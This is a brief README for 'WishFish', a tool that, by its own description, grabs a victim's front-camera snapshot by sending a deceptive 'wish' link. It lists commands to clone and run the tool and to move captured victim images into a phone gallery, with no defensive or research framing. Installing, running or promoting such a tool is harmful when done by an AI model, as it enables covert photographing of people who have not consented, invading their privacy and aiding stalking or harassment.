# WishFish
Grab victim front cam snap by sending wishes

Installation -

$ apt-get update -y 

$ apt-get upgrade -y 

$ git clone https://github.com/kinghacker0/WishFish.git

$ cd WishFish 

Usage - 

$ bash wishfish.sh 

to see captured images - 

$ ls

$ mv (image name .png) /sdcard

Now go and chek your gallery for victim image -
